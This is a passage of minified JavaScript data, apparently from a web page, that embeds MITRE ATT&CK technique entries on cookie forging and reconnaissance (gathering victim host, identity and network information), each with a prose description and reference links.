authenticate and authorize user access.\n\nAdversaries may generate these cookies in order to gain access to web resources. This differs from \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1539'\u003ESteal Web Session Cookie\u003C\u002Fa\u003E and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwunderwuzzi23.github.io\u002Fblog\u002Fpassthecookie.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E The generation of web cookies often requires secret values, such as passwords, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1552\u002F004'\u003EPrivate Keys\u003C\u002Fa\u003E, or other cryptographic seed values.\n\nOnce forged, adversaries may use these web cookies to access resources (\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1550\u002F004'\u003EWeb Session Cookie\u003C\u002Fa\u003E), which may bypass multi-factor and other authentication protection mechanisms.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.volexity.com\u002Fblog\u002F2020\u002F12\u002F14\u002Fdark-halo-leverages-solarwinds-compromise-to-breach-organizations\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwunderwuzzi23.github.io\u002Fblog\u002Fpassthecookie.html'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Funit42.paloaltonetworks.com\u002Fmac-malware-steals-cryptocurrency-exchanges-cookies\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";ts.external_references=[{source_name:b,external_id:tt,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1606\u002F001"},{description:cS,url:cT,source_name:cU},{source_name:"Volexity SolarWinds",url:"https:\u002F\u002Fwww.volexity.com\u002Fblog\u002F2020\u002F12\u002F14\u002Fdark-halo-leverages-solarwinds-compromise-to-breach-organizations\u002F",description:"Cash, D. et al. (2020, December 14). Dark Halo Leverages SolarWinds Compromise to Breach Organizations. Retrieved December 29, 2020."},{source_name:cV,url:cW,description:cX}];ts["subtechnique-of"]=cR;tu.id=tv;tu["object-type"]=a;tu.name="Client Configurations";tu.description="Adversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system\u002Fversion, virtualization, architecture (ex: 32 or 64 bit), language, and\u002For time zone.\n\nAdversaries may gather this information in various ways, such as direct collection actions via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1595'\u003EActive Scanning\u003C\u002Fa\u003E (ex: listening ports, server banners, user agent strings) or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcybersecurity.att.com\u002Fblogs\u002Flabs-research\u002Fscanbox-a-reconnaissance-framework-used-on-watering-hole-attacks'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Information about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596'\u003ESearch Open Technical Databases\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1587'\u003EDevelop Capabilities\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1588'\u003EObtain Capabilities\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1195'\u003ESupply Chain Compromise\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1133'\u003EExternal Remote Services\u003C\u002Fa\u003E).";tu.external_references=[{source_name:b,external_id:tv,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1592\u002F004"},{source_name:aw,url:ax,description:ay}];tu["subtechnique-of"]=aR;tw.id=tx;tw["object-type"]=a;tw.name="Firmware";tw.description="Adversaries may gather information about the victim's host firmware that can be used during targeting. Information about host firmware may include a variety of details such as type and versions on specific hosts, which may be used to infer more information about hosts in the environment (ex: configuration, purpose, age\u002Fpatch level, etc.).\n\nAdversaries may gather this information in various ways, such as direct elicitation via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E. Information about host firmware may only be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices).\u003Csup\u003E\u003Ca href='https:\u002F\u002Farstechnica.com\u002Finformation-technology\u002F2020\u002F08\u002Fintel-is-investigating-the-leak-of-20gb-of-its-source-code-and-private-data\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Gathering this information may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596'\u003ESearch Open Technical Databases\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1587'\u003EDevelop Capabilities\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1588'\u003EObtain Capabilities\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1195'\u003ESupply Chain Compromise\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1190'\u003EExploit Public-Facing Application\u003C\u002Fa\u003E).";tw.external_references=[{source_name:b,external_id:tx,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1592\u002F003"},{source_name:"ArsTechnica Intel",url:"https:\u002F\u002Farstechnica.com\u002Finformation-technology\u002F2020\u002F08\u002Fintel-is-investigating-the-leak-of-20gb-of-its-source-code-and-private-data\u002F",description:"Goodin, D. & Salter, J. (2020, August 6). More than 20GB of Intel source code and proprietary data dumped online. Retrieved October 20, 2020."}];tw["subtechnique-of"]=aR;ty.id=tz;ty["object-type"]=a;ty.name="Hardware";ty.description="Adversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card\u002Fbiometric readers, dedicated encryption hardware, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1595'\u003EActive Scanning\u003C\u002Fa\u003E (ex: hostnames, server banners, user agent strings) or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcybersecurity.att.com\u002Fblogs\u002Flabs-research\u002Fscanbox-a-reconnaissance-framework-used-on-watering-hole-attacks'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596'\u003ESearch Open Technical Databases\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1587'\u003EDevelop Capabilities\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1588'\u003EObtain Capabilities\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1195\u002F003'\u003ECompromise Hardware Supply Chain\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1200'\u003EHardware Additions\u003C\u002Fa\u003E).";ty.external_references=[{source_name:b,external_id:tz,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1592\u002F001"},{source_name:aw,url:ax,description:ay}];ty["subtechnique-of"]=aR;tA.id=tB;tA["object-type"]=a;tA.name="Software";tA.description="Adversaries may gather information about the victim's host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1595'\u003EActive Scanning\u003C\u002Fa\u003E (ex: listening ports, server banners, user agent strings) or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcybersecurity.att.com\u002Fblogs\u002Flabs-research\u002Fscanbox-a-reconnaissance-framework-used-on-watering-hole-attacks'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Information about the installed software may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596'\u003ESearch Open Technical Databases\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1587'\u003EDevelop Capabilities\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1588'\u003EObtain Capabilities\u003C\u002Fa\u003E), and\u002For for initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1195'\u003ESupply Chain Compromise\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1133'\u003EExternal Remote Services\u003C\u002Fa\u003E).";tA.external_references=[{source_name:b,external_id:tB,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1592\u002F002"},{source_name:aw,url:ax,description:ay}];tA["subtechnique-of"]=aR;tX.id=tY;tX["object-type"]=a;tX.name="Credentials";tX.description="Adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts.\n\nAdversaries may gather credentials from potential victims in various ways, such as direct elicitation via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E. Adversaries may also compromise sites then include malicious content designed to collect website authentication cookies from visitors.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcybersecurity.att.com\u002Fblogs\u002Flabs-research\u002Fscanbox-a-reconnaissance-framework-used-on-watering-hole-attacks'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Credential information may also be exposed to adversaries via leaks to online or other accessible data sets (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593\u002F002'\u003ESearch Engines\u003C\u002Fa\u003E, breach dumps, code repositories, etc.).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.theregister.com\u002F2017\u002F09\u002F26\u002Fdeloitte_leak_github_and_google\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.theregister.com\u002F2015\u002F02\u002F28\u002Fuber_subpoenas_github_for_hacker_details\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Flabs.detectify.com\u002F2016\u002F04\u002F28\u002Fslack-bot-token-leakage-exposing-business-critical-information\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.forbes.com\u002Fsites\u002Frunasandvik\u002F2014\u002F01\u002F14\u002Fattackers-scrape-github-for-cloud-service-credentials-hijack-account-to-mine-virtual-currency\u002F#242c479d3196'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fdxa4481\u002FtruffleHog'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fmichenriksen\u002Fgitrob'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.cnet.com\u002Fnews\u002Fmassive-breach-leaks-773-million-emails-21-million-passwords\u002F'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries may also purchase credentials from dark web or other black-markets. Gathering this information may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1586'\u003ECompromise Accounts\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1133'\u003EExternal Remote Services\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E).";tX.external_references=[{source_name:b,external_id:tY,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1589\u002F001"},{source_name:aw,url:ax,description:ay},{source_name:tF,url:tG,description:tH},{source_name:tI,url:tJ,description:tK},{source_name:tL,url:tM,description:tN},{source_name:tO,url:tP,description:tQ},{source_name:tR,url:tS,description:tT},{source_name:tU,url:tV,description:tW},{source_name:fF,url:fG,description:fH}];tX["subtechnique-of"]=bE;tZ.id=t_;tZ["object-type"]=a;tZ.name="Email Addresses";tZ.description="Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.\n\nAdversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593\u002F001'\u003ESocial Media\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1594'\u003ESearch Victim-Owned Websites\u003C\u002Fa\u003E).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.hackers-arise.com\u002Femail-scraping-and-maltego'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.cnet.com\u002Fnews\u002Fmassive-breach-leaks-773-million-emails-21-million-passwords\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Gathering this information may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1586\u002F002'\u003EEmail Accounts\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566'\u003EPhishing\u003C\u002Fa\u003E).";tZ.external_references=[{source_name:b,external_id:t_,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1589\u002F002"},{source_name:"HackersArise Email",url:"https:\u002F\u002Fwww.hackers-arise.com\u002Femail-scraping-and-maltego",description:"Hackers Arise. (n.d.). Email Scraping and Maltego. Retrieved October 20, 2020."},{source_name:fF,url:fG,description:fH}];tZ["subtechnique-of"]=bE;t$.id=ua;t$["object-type"]=a;t$.name="Employee Names";t$.description="Adversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and\u002For craft more-believable lures.\n\nAdversaries may easily gather employee names, since they may be readily available and exposed via online or other accessible data sets (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593\u002F001'\u003ESocial Media\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1594'\u003ESearch Victim-Owned Websites\u003C\u002Fa\u003E).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.opm.gov\u002Fcybersecurity\u002Fcybersecurity-incidents\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Gathering this information may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1586'\u003ECompromise Accounts\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566'\u003EPhishing\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E).";t$.external_references=[{source_name:b,external_id:ua,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1589\u002F003"},{source_name:tC,url:tD,description:tE}];t$["subtechnique-of"]=bE;ub.id=uc;ub["object-type"]=a;ub.name=jF;ub.description="Adversaries may gather information about the victim's DNS that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts.\n\nAdversaries may gather this information in various ways, such as querying or otherwise collecting details via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596\u002F001'\u003EDNS\u002FPassive DNS\u003C\u002Fa\u003E. DNS information may also be exposed to adversaries via online or other accessible data sets (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596'\u003ESearch Open Technical Databases\u003C\u002Fa\u003E).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdnsdumpster.com\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.circl.lu\u002Fservices\u002Fpassive-dns\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Gathering this information may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596'\u003ESearch Open Technical Databases\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E, or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1595'\u003EActive Scanning\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583'\u003EAcquire Infrastructure\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1584'\u003ECompromise Infrastructure\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1133'\u003EExternal Remote Services\u003C\u002Fa\u003E).";ub.external_references=[{source_name:b,external_id:uc,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1590\u002F002"},{source_name:az,url:aA,description:aB},{source_name:aT,url:aU,description:aV}];ub["subtechnique-of"]=_;ud.id=ue;ud["object-type"]=a;ud.name="Domain Properties";ud.description="Adversaries may gather information about the victim's network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers.\n\nAdversaries may gather this information in various ways, such as direct collection actions via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1595'\u003EActive Scanning\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E. Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596\u002F002'\u003EWHOIS\u003C\u002Fa\u003E).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.whois.net\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdnsdumpster.com\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.circl.lu\u002Fservices\u002Fpassive-dns\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Gathering this information may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596'\u003ESearch Open Technical Databases\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E, or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583'\u003EAcquire Infrastructure\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1584'\u003ECompromise Infrastructure\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566'\u003EPhishing\u003C\u002Fa\u003E).";ud.external_references=[{source_name:b,external_id:ue,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1590\u002F001"},{source_name:aS,url:bF,description:bG},{source_name:az,url:aA,description:aB},{source_name:aT,url:aU,description:aV}];ud["subtechnique-of"]=_;uf.id=ug;uf["object-type"]=a;uf.name="IP Addresses";uf.description="Adversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where\u002Fhow their publicly-facing infrastructure is hosted.\n\nAdversaries may gather this information in various ways, such as direct collection actions via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1595'\u003EActive Scanning\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E. Information about assigned IP addresses may also be exposed to adversaries via online or other accessible data sets (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596'\u003ESearch Open Technical Databases\u003C\u002Fa\u003E).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.whois.net\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdnsdumpster.com\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.circl.lu\u002Fservices\u002Fpassive-dns\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Gathering this information may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1595'\u003EActive Scanning\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583'\u003EAcquire Infrastructure\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1584'\u003ECompromise Infrastructure\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1133'\u003EExternal Remote Services\u003C\u002Fa\u003E).";uf.external_references=[{source_name:b,external_id:ug,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1590\u002F005"},{source_name:aS,url:bF,description:bG},{source_name:az,url:aA,description:aB},{source_name:aT,url:aU,description:aV}];uf["subtechnique-of"]=_;uh.id=ui;uh["object-type"]=a;uh.name="Network Security Appliances";uh.description="Adversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies\u002Fbastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations.\n\nAdversaries may gather this information in various ways, such as direct collection actions via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1595'\u003EActive Scanning\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fnmap.org\u002Fbook\u002Ffirewalls.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Information about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1594'\u003ESearch Victim-Owned Websites\u003C\u002Fa\u003E). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596'\u003ESearch Open Technical Databases\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1587'\u003EDevelop Capabilities\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1588'\u003EObtain Capabilities\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1133'\u003EExternal Remote Services\u003C\u002Fa\u003E).";uh.external_references=[{source_name:b,external_id:ui,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1590\u002F006"},{source_name:"Nmap Firewalls NIDS",url:"https:\u002F\u002Fnmap.org\u002Fbook\u002Ffirewalls.html",description:"Nmap. (n.d.). Chapter 10. Detecting and Subverting Firewalls and Intrusion Detection Systems. Retrieved October 20, 2020."}];uh["subtechnique-of"]=_;uj.id=uk;uj["object-type"]=a;uj.name="Network Topology";uj.description="Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and\u002For logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure.\n\nAdversaries may gather this information in various ways, such as direct collection actions via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1595'\u003EActive Scanning\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E. Information about network topologies may also be exposed to adversaries via online or other accessible data sets (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1594'\u003ESearch Victim-Owned Websites\u003C\u002Fa\u003E).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdnsdumpster.com\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Gathering this information may reveal opportunities for other forms of 